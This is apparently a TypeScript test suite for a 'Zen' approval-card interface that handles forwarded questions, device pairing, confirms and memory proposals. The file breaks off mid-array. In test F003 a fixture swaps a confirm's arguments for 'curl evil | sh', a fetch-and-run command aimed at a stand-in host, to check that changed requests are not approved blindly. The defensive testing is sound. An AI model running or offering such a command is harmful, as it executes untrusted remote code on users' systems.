const BOX = () => FWD({ device: "yw4ub3j7mxbzdfs55auv7rosl4", dialogId: "fc9fc519", digest: "a".repeat(64), owner: "subagent - scout", dialog: JSON.stringify({ questions: BOX_QUESTIONS, cancel: true }), label: "waydosoft", short: "n2knna", answered: 0 });

test("a question an unattended box forwarded is the whole page at rest, with no tap: the box's name as the title, the unit that asked in the sentence, the questions, and Send, Cancel and Maybe later", async () => {
	const sent = server();
	const r = rig();
	r.feed(linkNet({ alerts: [BOX()] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "waydosoft asks you");
	const card = r.by((el) => el.classes.has("zen-card"))[0]!;
	assert.ok(card.textContent.includes("waydosoft (n2knna)") && card.textContent.includes("asks a question (subagent - scout)"), card.textContent);
	assert.ok(card.textContent.includes("Which env?") && card.textContent.includes("staging") && card.textContent.includes("production"));
	for (const label of ["Send answer", "Cancel", "Maybe later"]) assert.ok(r.button(label), label);
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length, 0, "the circle is not what is shown");
	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
	r.button("Send answer")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ path: "api/link/dialog-answer", body: { device: "yw4ub3j7mxbzdfs55auv7rosl4", dialogId: "fc9fc519", digest: "a".repeat(64), answer: { answers: [{ choices: [0] }] } } }]);
});

test("a pair request is a card with the number field, Allow and Deny; Allow is off until four digits, posts the number alone, and the knock follows; Deny posts the request's id", async () => {
	const sent = server(() => ({ status: 200, body: { paired: { id: "ab12cd34ef56", label: "Mei's iPhone", peer: "p" } } }));
	const r = rig();
	r.feed(linkNet());
	r.z.pairs([PAIR]);
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "Mei's iPhone asks to pair");
	assert.ok(r.text().includes("Pair request: Mei's iPhone from 192.168.1.20 (en0), 20 s ago"));
	const field = r.by((el) => el.tagName === "input")[0]!;
	assert.equal(page.focused, field, "the number is the first thing to answer");
	assert.ok(r.button("Allow")!.disabled);
	field.value = "12a3";
	field.bubble("input", {});
	assert.equal(field.value, "123", "digits only");
	assert.ok(r.button("Allow")!.disabled);
	field.value = "1234";
	field.bubble("input", {});
	assert.equal(r.button("Allow")!.disabled, false);
	r.button("Allow")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ path: "api/lan/approve", body: { number: "1234" } }]);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	const d = rig();
	d.feed(linkNet());
	d.z.pairs([PAIR]);
	d.z.show();
	await d.settle();
	d.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await d.settle();
	d.button("Deny")!.click();
	await d.settle();
	assert.deepEqual(sent.at(-1), { path: "api/lan/approve", body: { deny: "ab12cd34ef56" } });
});

test("a wrong number is the low bowl and the server's words; three wrong numbers say every request was denied", async () => {
	let denied = 0;
	server(() => ({ status: 404, body: { error: "no_match", reason: "No request has that number.", ...(denied ? { denied } : {}) } }));
	const r = rig();
	r.feed(linkNet());
	r.z.pairs([PAIR]);
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const field = r.by((el) => el.tagName === "input")[0]!;
	field.value = "0000";
	field.bubble("input", {});
	r.button("Allow")!.click();
	await r.settle();
	assert.ok(r.text().includes("No request has that number."));
	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
	denied = 2;
	r.button("Allow")!.click();
	await r.settle();
	assert.ok(r.text().includes("Three wrong numbers in a row"));
});

test("a pair request raises no card on a paired device's page (the server refuses it Wi-Fi access), and a request the list drops is settled", async () => {
	server();
	const remote = rig({ remote: true });
	remote.feed(linkNet());
	remote.z.pairs([PAIR]);
	remote.z.show();
	await remote.settle();
	remote.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await remote.settle();
	noCard(remote);
	const here = rig();
	here.feed(linkNet());
	here.z.show();
	here.z.pairs([PAIR]);
	await here.settle();
	assert.equal(here.by((el) => el.classes.has("zen-card")).length, 0, "a request that arrives while Zen is up waits for Enter");
	here.z.key("talk");
	await here.settle();
	assert.equal(here.by((el) => el.classes.has("zen-card")).length, 1, "and is the card once the boss takes it");
	here.z.pairs([]);
	assert.ok(here.text().includes("Already answered elsewhere"));
});

test("a confirm still reaches a paired device's page: the server lets it answer confirm-answer", async () => {
	server();
	const r = rig({ remote: true });
	r.feed(linkNet({ confirms: [CONFIRM], alerts: [FWD()] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1);
	assert.ok(r.button("Allow"));
});

test("a memory proposal is the tower's card: the title names the tower once, the proposal and the message it comes from, Confirm names the rev, Reject the id", async () => {
	const sent = server(() => ({ status: 200, body: { rev: 8, proposals: [], entries: [] } }));
	const r = rig();
	r.feed(linkNet({ proposals: [PROPOSAL] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "tower · Harbor");
	assert.ok(r.text().includes("The tower proposes a standing instruction: Never deploy on Fridays") && r.text().includes("From your message: no deploys before the holiday"));
	for (const label of ["Confirm", "Reject", "Maybe later"]) assert.ok(r.button(label), label);
	r.button("Confirm")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ path: "api/tower/w/memory", body: { op: "confirm", proposal: "P1", rev: 7 } }]);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	const j = rig();
	j.feed(linkNet({ proposals: [PROPOSAL] }));
	j.z.show();
	await j.settle();
	j.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await j.settle();
	j.button("Reject")!.click();
	await j.settle();
	assert.deepEqual(sent.at(-1), { path: "api/tower/w/memory", body: { op: "reject", proposal: "P1" } });
});

test("a proposal the memory refuses keeps its card with the tower's refusal", async () => {
	server(() => ({ status: 409, body: { error: "refused", reason: "The memory changed since you read it" } }));
	const r = rig();
	r.feed(linkNet({ proposals: [PROPOSAL] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Confirm")!.click();
	await r.settle();
	assert.ok(r.text().includes("The tower refused it: The memory changed since you read it"));
	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
});

test("the corner leaves a card for where Standard has it: the tower's comms for a proposal, the page itself for the others; no dialog is opened for a card", async () => {
	server();
	const p = rig();
	p.feed(linkNet({ proposals: [PROPOSAL] }));
	p.z.show();
	await p.settle();
	p.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await p.settle();
	p.z.leave();
	assert.deepEqual(p.calls.leave, [{ route: { view: "session", ws: "w", key: "t" } }]);
	const c = rig();
	c.feed(linkNet({ confirms: [CONFIRM] }));
	c.z.show();
	await c.settle();
	c.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await c.settle();
	c.z.leave();
	assert.deepEqual(c.calls.leave, [{}]);
});

test("two cards at once show one: nothing on the page counts or hints at the other", async () => {
	server();
	const r = rig();
	r.feed(linkNet({ confirms: [CONFIRM], proposals: [PROPOSAL] }));
	r.z.pairs([PAIR]);
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1);
	assert.equal(/\b[2-3]\b/.test(r.text()), false, "no tally");
	const first = r.by((el) => el.classes.has("zen-who"))[0]!.textContent;
	r.button("Maybe later")!.click();
	await r.advance(4000);
	assert.notEqual(r.by((el) => el.classes.has("zen-who"))[0]?.textContent, first, "the next card follows the pause");
});

test("a snapshot that drops the confirm before the answer's reply arrives still ends in Answered, with one knock", async () => {
	const sent = server(() => ({ status: 200, body: {} }));
	const r = rig();
	r.feed(linkNet({ confirms: [CONFIRM] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Allow")!.click();
	r.feed(linkNet()); // the server dropped it and the snapshot came ahead of its reply
	await r.settle();
	assert.equal(sent.length, 1);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	assert.ok(r.text().includes("Answered.") && !r.text().includes("Already answered elsewhere"));
});

// --- review ZLC-F001..F007 and the screenshot read (L1, L2) -----------------------------------------------------------------------------------------------------------------------------------------------------------------

test("F001: Confirm names the rev the snapshot holds when it is pressed, not the one the card was made with", async () => {
	const sent = server(() => ({ status: 200, body: { rev: 9, proposals: [], entries: [] } }));
	const r = rig();
	r.feed(linkNet({ proposals: [PROPOSAL], rev: 7 }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.feed(linkNet({ proposals: [PROPOSAL], rev: 8 })); // a wait was added to the memory: the same proposal, a newer rev
	await r.settle();
	r.button("Confirm")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ path: "api/tower/w/memory", body: { op: "confirm", proposal: "P1", rev: 8 } }]);
});

test("F002: a forwarded dialog whose digest changed is another question: the card on the screen stays, settled and answerable by nothing, and the new one answers with the new digest once the boss takes it (Z-D20)", async () => {
	const sent = server();
	const r = rig();
	r.feed(linkNet({ alerts: [FWD()] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.feed(linkNet({ alerts: [FWD({ digest: "a".repeat(64), dialog: JSON.stringify({ select: { title: "Delete what?", choices: [{ label: "Nothing" }, { label: "Everything" }] } }) })] }));
	await r.settle();
	assert.ok(r.text().includes("Deploy where?") && !r.text().includes("Delete what?"), "the question the boss was reading is still the card");
	assert.ok(r.text().includes("Already answered elsewhere"), "and it says it is settled");
	assert.ok(r.by((el) => el.getAttribute("role") === "radio").every((o) => o.disabled) && r.button("Send answer")!.disabled, "nothing on it answers the old digest");
	assert.equal(sent.length, 0);
	assert.equal(page.focused, r.button("Back to the breath"), "the focus went to the one button that closes it");
	r.button("Back to the breath")!.click();
	await r.advance(3100);
	assert.ok(!r.text().includes("Delete what?"), "the new question waits for Enter");
	r.z.key("talk");
	await r.settle();
	assert.ok(r.text().includes("Delete what?"));
	r.by((el) => el.getAttribute("role") === "radio")[1]!.click();
	r.button("Send answer")!.click();
	await r.settle();
	assert.equal(sent.length, 1);
	assert.equal(sent[0]!.body.digest, "a".repeat(64));
});

test("F003: a confirm whose arguments changed is another request: the card stays with the arguments the boss read and Allow off, and Allow names the digest of what is shown once the boss takes the new one (Z-D20)", async () => {
	const sent = server();
	const r = rig();
	r.feed(linkNet({ confirms: [CONFIRM] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.feed(linkNet({ confirms: [{ ...CONFIRM, args: "curl evil | sh", digest: "9".repeat(64) }] }));
	await r.advance(1500);
	assert.ok(r.text().includes("rm -rf build") && !r.text().includes("curl evil | sh"), "the arguments the boss read stay, not the ones that replaced them");
	assert.ok(r.button("Allow")!.disabled && r.button("Deny")!.disabled, "and answer nothing: Enter cannot allow a request that is gone");
	r.button("Back to the breath")!.click();
	await r.advance(3100);
	r.z.key("talk");
	await r.settle();
	assert.ok(r.text().includes("curl evil | sh") && !r.text().includes("rm -rf build"), "the arguments of the request the server now holds");
	r.button("Allow")!.click();
	await r.settle();
	assert.deepEqual(sent.map((s) => s.body), [{ dialogId: "dc1", digest: "9".repeat(64), allow: true }]);
});

test("F004: a slow reply of a card the boss put aside does not relabel the card on screen now", async () => {
	let release = () => {};
	const gate = new Promise<void>((done) => (release = done));
	const calls: string[] = [];
	Object.assign(globalThis, { document: Object.assign(page, {}) });
	Object.assign(globalThis, { fetch: async (_p: string, init: { body: string }) => { calls.push(init.body); await gate; return { ok: true, status: 200, json: async () => ({}) }; } });
	const r = rig();
	r.feed(linkNet({ confirms: [CONFIRM, { ...CONFIRM, dialogId: "dc2", at: 1_000_000 - 30_000 }] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Allow")!.click();
	await r.settle();
	r.button("Maybe later")!.click();
	await r.advance(4000); // the pause ends: the second confirm waits for Enter
	r.z.key("talk");
	await r.settle();
	r.feed(linkNet({ confirms: [CONFIRM] })); // the server dropped the second one
	await r.settle();
	assert.ok(r.text().includes("Already answered elsewhere"));
	release();
	await r.settle();
	assert.ok(r.text().includes("Already answered elsewhere") && !r.text().includes("Answered."), "the first card's reply is not this card's");
});

test("F005: Deny of a pair request the server no longer holds is a refusal, not Answered", async () => {
	server(() => ({ status: 200, body: { denied: 0 } }));
	const r = rig();
	r.feed(linkNet());
	r.z.pairs([PAIR]);
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Deny")!.click();
	await r.settle();
	assert.ok(!r.text().includes("Answered."));
	assert.ok(r.text().includes("That request is gone"));
	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
});

test("F006: Allow with the number of another request does not read as Answered on this card", async () => {
	server(() => ({ status: 200, body: { paired: { id: "other-request", label: "Sam's Pixel", peer: "192.168.1.30" } } }));
	const r = rig();
	r.feed(linkNet());
	r.z.pairs([PAIR]);
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const field = r.by((el) => el.tagName === "input")[0]!;
	field.value = "1234";
	field.bubble("input", {});
	r.button("Allow")!.click();
	await r.settle();
	assert.ok(!r.text().includes("Answered."), "this card's request was not the one paired");
	assert.ok(r.text().includes("Sam's Pixel"), "it says who was paired");
	assert.equal(r.button("Allow")!.disabled, false, "this request still waits");
});

test("a question the box forwarded lands on a page that is already open: it does not replace the screen, it waits for Enter with the cue, with no reload", async () => {
	server();
	const r = rig({ start: null });
	r.feed(linkNet());
	r.z.show();
	await r.settle();
	noCard(r);
	r.feed(linkNet({ alerts: [BOX()] }));
	await r.settle();
	noCard(r);
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
	r.z.key("talk");
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, r.text());
	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "waydosoft asks you");
});

test("a question lands on a hidden page that sits in the pause after a card: the page reminds, once, and the card waits for Enter with no reload", async () => {
	server();
	const r = rig({ start: null });
	r.feed(linkNet({ alerts: [FWD()] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.feed(linkNet()); // answered elsewhere: the knock, and the card says so until the boss closes it
	await r.settle();
	r.button("Back to the breath")!.click();
	await r.advance(1300);
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length >= 1, true, "the pause");
	page.hidden = true;
	r.z.visible(false);
	r.feed(linkNet({ alerts: [{ ...BOX(), id: "dlg-2" }] }));
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "no card is drawn on a page nobody is looking at");
	assert.deepEqual(r.calls.remind, ["link-dialog\u001fdlg-2"], "the system notification that Standard would show");
	page.hidden = false;
	r.z.visible(true);
	r.z.key("talk");
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "Enter takes it");
});

test("a question from a box that waits and is not the card on the screen says why once in the console, each time the reason changes, and says no more when it is the card", async () => {
	server();
	const r = rig({ start: null });
	r.feed(net([unit("a", "waiting", { since: 5, pending: select() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const withBox = () => { const n = net([unit("a", "waiting", { since: 5, pending: select() })]); n.link = { allies: [], units: [], alerts: [BOX()], confirms: [] } as never; return n; };
	r.feed(withBox());
	r.feed(withBox());
	assert.deepEqual(r.calls.debug, ["[sb] a question from waydosoft waits and is not on the Zen page: a is on the screen"], "once");
	const only = () => { const n = net([]); n.link = { allies: [], units: [], alerts: [BOX()], confirms: [] } as never; return n; };
	r.feed(only()); // the unit is answered: its card stays, saying so, until the boss closes it
	await r.advance(60_000);
	r.feed(only());
	assert.deepEqual(r.calls.debug.slice(1), [], "the card that ended is still the screen: nothing new to say");
	r.button("Back to the breath")!.click();
	await r.advance(1000);
	r.feed(only());
	await r.advance(3100);
	r.feed(only());
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "no card takes the screen by itself");
	assert.deepEqual(r.calls.debug.slice(1), ["[sb] a question from waydosoft waits and is not on the Zen page: the pause after a card is on", "[sb] a question from waydosoft waits and is not on the Zen page: it waits for Enter: no card takes the screen by itself"], "each reason once");
	r.z.key("talk");
	await r.settle();
	r.feed(only());
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "now it is the card");
	assert.equal(r.calls.debug.length, 3, "and nothing more is said");
	const off = rig();
	off.feed(linkNet({ alerts: [BOX()] }));
	assert.deepEqual(off.calls.debug, ["[sb] a question from waydosoft waits and is not on the Zen page: the Zen layer is not shown"], "the layer has not been shown yet");
});

test("T1: a question that was the card when Zen was left, and was answered and closed while the page showed Standard, is no card when Zen comes back (the model kept the item it had on the screen)", async () => {
	server();
	const r = rig();
	r.feed(linkNet({ alerts: [BOX()] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "the card");
	r.z.hide(); // Esc Esc: Standard shows it, and the boss answers it in the ally base's panel
	r.feed(linkNet()); // the dialog closed: the link no longer lists it
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, `no card for a closed dialog: ${r.text()}`);
	assert.equal(r.by((el) => el.classes.has("zen-out") && el.textContent !== "").length, 0, "and no line about an answer the boss gave himself in Standard");
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length >= 1, true, "the breathing circle");
});

// --- Z-D19 (docs/specs/2026-11-01-zen-view.md, Cards wait for Enter): on the breathing circle no card takes the screen; the boss takes the next one with Enter ------------------------------------------------------

/** A tower wait for the boss (the notice-type card of the trial) with, when asked, the question a box forwarded beside it. */
const waitAndBox = (r: { now(): number }, box: boolean) => {
	const n = waitNet(r);
	n.link = { allies: [], units: [], alerts: box ? [BOX()] : [], confirms: [] } as never;
	return n;
};
const escape = (r: ReturnType<typeof rig>) => r.z.escape({ preventDefault() {} });
const whoIs = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("zen-card") && el.getAttribute("data-gone") === null).map((c) => c.all((el) => el.classes.has("zen-who"))[0]?.textContent);
const BOX_KEY = `link-dialog\u001fdlg-1`;
const OUTCOME = 1200, PAUSE = 3000;
const cue = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("zen-head-cue"))[0];
const cueText = (r: ReturnType<typeof rig>) => (cue(r)?.dataset.away === undefined ? r.by((el) => el.classes.has("zen-head-cue-btn"))[0]?.textContent : "");
const enterKey = (r: ReturnType<typeof rig>) => r.z.key("talk"); // Enter on the circle screen
const cards = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("zen-card") && el.getAttribute("data-gone") === null).length;

test("Z-D19: on the breathing circle no card takes the screen, whatever its kind: the circle stays, no bowl, no focus moved, and the cue above the input says how many wait for Enter", async () => {
	server();
	const r = rig({ start: null });
	r.feed(waitAndBox(r, true));
	r.z.show();
	await r.settle();
	await r.advance(60_000);
	assert.equal(cards(r), 0, "no card");
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length, 1, "the breathing circle");
	assert.deepEqual(r.calls.sound, [], "no bowl for a queued card");
	assert.equal(page.focused, undefined, "no focus taken");
	assert.equal(cueText(r), "2 cards wait for Enter. No rush, when you're ready.", "the cue: how many, and no hurry");
	assert.ok(!r.text().includes("Boss token needed") && !r.text().includes("waydosoft"), "nothing of what they ask");
	r.feed(waitAndBox(r, false));
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "one");
	r.feed(net([]));
	assert.equal(cueText(r), "", "none: the line is away, and keeps its room");
});

test("Z-D19: Enter takes the next card, the blocking question first, with the bowl and the focus; the answer is followed by the other card directly (Z-D22), and Not now returns to the breath", async () => {
	const sent = server();
	const r = rig({ start: null });
	r.feed(waitAndBox(r, true));
	r.z.show();
	await r.settle();
	assert.equal(enterKey(r), true, "Enter is Zen's");
	assert.deepEqual(whoIs(r), ["waydosoft asks you"], "blocking first, though the wait is older");
	assert.deepEqual(r.calls.sound, ["bowl"]);
	assert.equal(page.focused, r.by((el) => el.getAttribute("role") === "radio")[0], "the question's first choice has the focus");
	assert.equal(cueText(r) ?? "", "", "no cue on a card");
	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
	r.button("Send answer")!.click();
	await r.settle();
	assert.equal(sent.length, 1, "answered through the same route");
	r.feed(waitAndBox(r, false)); // the box's dialog closed
	await r.advance(OUTCOME + 100);
	assert.deepEqual(r.calls.sound, ["bowl", "knock", "bowl"], "the wait is taken as a taken card is: the bowl");
	assert.ok(r.text().includes("Boss token needed to add the ACL") && r.button("Reply to the tower"), "the wait follows the boss's answer: no pause, no breath");
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length, 0);
	await r.advance(DWELL + 1);
	r.button("Maybe later")!.click(); // Not now is not an answer: the breath, as before
	await r.advance(PAUSE + 100);
	assert.equal(cards(r), 0, "back to the breath");
	assert.equal(cueText(r) ?? "", "", "the wait rests; nothing else waits");
});

test("Z-D19: a tap on the cue takes the next card as Enter does", async () => {
	server();
	const r = rig({ start: null });
	r.feed(waitAndBox(r, false));
	r.z.show();
	await r.settle();
	r.by((el) => el.classes.has("zen-head-cue-btn"))[0]!.click();
	assert.ok(r.text().includes("Boss token needed to add the ACL"));
});

test("Z-D19: while a card waits, the input's hint says to click, since Enter takes the card first", async () => {
	server();
	const r = rig({ start: null });
	r.feed(net([]));
	r.z.show();
	await r.settle();
	const hint = () => r.by((el) => el.classes.has("zen-head-hint"))[0]!.textContent;
	assert.equal(hint(), "The head tower needs the tower service (towerRuns)", "no head tower here: unchanged");
	const withHead = rig({ start: null });
	const n = (waits: boolean) => ({ ...(waits ? waitNet(withHead) : net([])), head: { key: "sb-head", name: "head tower", mark: "idle", state: "running", service: { state: "running", queued: 0, notices: [], parked: [], allyRuns: [] }, asks: [] } }) as never as Net;
	withHead.feed(n(false));
	withHead.z.show();
	await withHead.settle();
	const hintOf = () => withHead.by((el) => el.classes.has("zen-head-hint"))[0]!.textContent;
	assert.equal(hintOf(), "Enter to talk to the head tower");
	withHead.feed(n(true));
	assert.equal(hintOf(), "Click to talk to the head tower", "a card waits for Enter");
	withHead.feed(n(false));
	assert.equal(hintOf(), "Enter to talk to the head tower");
});

test("Z-D19: a page nobody is looking at gets one system reminder for each card that waits, and no more; the card is not drawn", async () => {
	server();
	const r = rig({ start: null });
	r.feed(waitAndBox(r, false));
	r.z.show();
	await r.settle();
	page.hidden = true;
	r.z.visible(false);
	r.feed(waitAndBox(r, true));
	await r.settle();
	r.feed(waitAndBox(r, true));
	await r.advance(5000);
	assert.deepEqual(r.calls.remind.sort(), [BOX_KEY, `wait\u001fw\u001fW2`].sort(), "one reminder for each");
	assert.equal(cards(r), 0, "and nothing is drawn");
	await r.advance(60_000);
	assert.equal(r.calls.remind.length, 2, "not again");
});

const WAIT_KEY = `wait\u001fw\u001fW2`;

test("Z-D19 (ZD19-F002): a card is reminded once for as long as the server lists it: a card on the screen, Maybe later, and a page hidden again do not make the page remind about the one that waited all along", async () => {
	server();
	const r = rig({ start: null });
	r.feed(waitAndBox(r, true));
	page.hidden = true;
	r.z.visible(false);
	r.z.show();
	await r.settle();
	assert.deepEqual(r.calls.remind.sort(), [BOX_KEY, WAIT_KEY].sort(), "one for each while nobody looks");
	page.hidden = false;
	r.z.visible(true);
	assert.equal(enterKey(r), true);
	assert.deepEqual(whoIs(r), ["waydosoft asks you"], "the box's question took the screen: nothing is queued now");
	r.feed(waitAndBox(r, true)); // a snapshot while a card is on the screen
	r.button("Maybe later")!.click();
	page.hidden = true;
	r.z.visible(false);
	await r.advance(PAUSE + 100);
	r.feed(waitAndBox(r, true));
	assert.deepEqual(r.calls.remind.sort(), [BOX_KEY, WAIT_KEY].sort(), "the wait is not reminded a second time, nor the card put aside");
	r.feed(net([])); // the server stopped listing both
	r.feed(waitAndBox(r, true)); // and they come back as new
	assert.equal(r.calls.remind.length, 4, "a card that left and came back is a new card");
	page.hidden = false;
});

test("Z-D19 (ZD19-F005): a visible page that has lost the focus is a page nobody is looking at: the reminder goes out, once", async () => {
	server();
	const r = rig({ start: null });
	page.focus = false;
	r.feed(waitAndBox(r, true));
	r.z.show();
	await r.settle();
	assert.equal(page.hidden, false, "the page is in front");
	assert.deepEqual(r.calls.remind.sort(), [BOX_KEY, WAIT_KEY].sort(), "but nobody has it in focus");
	await r.advance(60_000);
	assert.equal(r.calls.remind.length, 2, "once");
	const looked = rig({ start: null });
	looked.feed(waitAndBox(looked, true));
	looked.z.show();
	await looked.settle();
	assert.deepEqual(looked.calls.remind, [], "with the focus there, none");
});

test("Z-D20: with a session for company no card takes the screen by itself either, and a question that arrives behind a card the boss took waits for it", async () => {
	server();
	const r = rig();
	r.feed(waitAndBox(r, false));
	r.z.show();
	await r.settle();
	assert.equal(cards(r), 0, "the companion stays: the card waits for Enter");
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "the companion's screen says so, under the name");
	r.z.key("talk");
	await r.settle();
	assert.ok(r.text().includes("Boss token needed to add the ACL"), "Enter took it");
	r.feed(waitAndBox(r, true));
	await r.advance(60_000);
	assert.ok(r.text().includes("Boss token needed") && !r.text().includes("waydosoft asks you"), "never interrupted, untouched or not");
	assert.deepEqual(r.calls.debug, [`[sb] a question from waydosoft waits and is not on the Zen page: ${WAIT_KEY} is on the screen`], "the console says once why the question is not on the page");
	r.button("Maybe later")!.click();
	await r.advance(PAUSE + 100);
	assert.equal(cards(r), 0, "the question does not follow the pause by itself");
	r.z.key("talk");
	await r.settle();
	assert.deepEqual(whoIs(r), ["waydosoft asks you"], "it comes by Enter");
});

// #93 (Zen part, boss 2026-11-06: 「zen mode 則不理這些回報」): an ally base's unit-status report and a Straw Link notice are not Zen items; only a real question a box forwarded is.
test("#93: an ally base's unit-status report and a Link notice are no item in Zen: no card, no cue count, no chime, no change of the breath; a forwarded question still counts", async () => {
	server();
	const r = rig({ start: null });
	const ally = (extra: { alerts?: unknown[]; units?: unknown[] } = {}) => {
		const n = linkNet({ alerts: (extra.alerts ?? []) as never });
		n.link!.allies = [{ id: "t/d1/Harbor API", team: "t", teamName: "moldplan", device: "d1", short: "9f3a1c", label: "ci-box", online: true, workspace: "Harbor API", tower: "working", tabs: [{ label: "tower", state: "working" }] }] as never;
		n.link!.units = (extra.units ?? []) as never;
		return n;
	};
	r.feed(ally());
	r.z.show();
	await r.settle();
	assert.equal(cueText(r), "", "nothing waits");
	const circle = r.by((el) => el.classes.has("zen-circle"))[0];
	const notice = { id: "notice/1", kind: "notice", level: "warning", team: "t", teamName: "moldplan", data: { device: "d1", label: "ci-box", short: "9f3a1c", what: "run-crashed", unit: "Harbor API", text: "An ally run crashed: pi exited without tower_done" } };
	const reports = [{ team: "t", device: "d1", units: [{ unit: "Harbor API", state: "waiting", monitors: [], report: "Deployed v1.2 to staging. Next: waiting for the review." }, { unit: "billing", state: "error", monitors: [] }] }];
	r.feed(ally({ alerts: [notice], units: reports }));
	await r.advance(60_000);
	assert.equal(cueText(r), "", "no count for a report or a notice");
	assert.equal(cards(r), 0);
	assert.deepEqual(r.calls.sound, [], "no chime");
	assert.deepEqual(r.calls.remind, [], "and no system reminder");
	assert.equal(r.by((el) => el.classes.has("zen-circle"))[0], circle, "the circle is the one it was: nothing redrew it");
	r.feed(ally({ alerts: [notice, BOX()], units: reports }));
	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "the box's real question is the one card");
});

// --- Z-D20 (docs/specs/2026-11-01-zen-view.md, Never interrupted; boss 2026-11-06 on 0.60.2): a card is taken by the boss and never comes or goes by itself; Enter presses the primary control of every card ---------------------------------

const TRUST_NET = () => net([], [TRUST]);
/** Each kind of card with the control that Enter must find: the card's primary control, which takes the focus when the card is taken. */
const KINDS: [string, (r: ReturnType<typeof rig>) => void, (r: ReturnType<typeof rig>) => unknown][] = [
	["a unit's dialog", (r) => r.feed(net([unit("a", "waiting", { since: 5, pending: select() })])), (r) => r.by((el) => el.getAttribute("role") === "radio")[0]],
	["a unit that waits on a terminal prompt (the words)", (r) => r.feed(net([unit("a", "waiting", { name: "docs-main", since: 5 })])), (r) => r.button("Open the terminal")],
	["a project trust question", (r) => r.feed(TRUST_NET()), (r) => r.button("Trust")],
	["a tower's wait", (r) => r.feed(waitNet(r)), (r) => r.button("Ask the tower to rewrite it")],
	["a teammate's confirm", (r) => r.feed(linkNet({ confirms: [CONFIRM] })), (r) => r.button("Allow")],
	["a memory proposal", (r) => r.feed(linkNet({ proposals: [PROPOSAL] })), (r) => r.button("Confirm")],
	["a pair request", (r) => (r.feed(linkNet()), r.z.pairs([PAIR])), (r) => r.by((el) => el.classes.has("zen-pair-number"))[0]],
